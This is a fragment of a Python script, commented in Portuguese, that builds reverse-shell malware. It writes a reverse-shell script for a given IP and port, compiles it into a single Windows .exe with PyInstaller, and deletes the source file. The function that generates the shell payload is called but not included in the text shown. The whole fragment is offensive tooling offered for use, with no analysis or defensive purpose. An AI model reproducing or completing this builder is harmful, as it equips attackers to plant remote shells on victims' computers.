import argparse
import subprocess
import os

# Função para gerar o executável .exe
def generate_exe_reverse_shell(ip, port):
    python_code = generate_python_reverse_shell(ip, port)
    with open('reverse_shell.py', 'w') as f:
        f.write(python_code)
    try:
        subprocess.run(['pyinstaller', '--onefile', 'reverse_shell.py'], check=True)
        os.remove('reverse_shell.py')
        print("[*] Reverse shell .exe gerado com sucesso.")
    except Exception as e:
        print(f"[-] Falha ao gerar o executável .exe: {e}")

# Função principal para gerar o reverse shell .exe
def generate_exe(ip, port):
    generate_exe_reverse_shell(ip, port)
